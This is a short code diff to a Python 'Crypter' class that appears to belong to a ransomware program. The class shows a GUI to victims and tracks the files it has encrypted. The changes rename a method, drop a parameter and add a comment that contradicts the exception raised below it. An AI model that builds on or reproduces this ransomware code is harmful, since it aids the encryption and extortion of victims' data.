@@ -113,14 +113,13 @@ class Crypter(Base.Base):
     crypter_gui = Gui.Gui(
         image_path=sys._MEIPASS, 
         start_time=start_time,
-        encrypted_file_list=self.encrypted_file_list,
         decrypter=self)
                                
     crypter_gui.Show()
     app.MainLoop()
     
 
-  def get_encrypted_file_list(self):
+  def get_encrypted_files_list(self):
     '''
     @summary: Returns a list of the files encrypted by crypter
     @return: Encrypted file list
@@ -132,6 +131,7 @@ class Crypter(Base.Base):
         file_list = fh.readlines()
       fh.close()
     except IOError:
+      # Don't error, just return message
       raise Exception("A list of encrypted files was not found at: %s" % self.encrypted_file_list)
   
     return file_list
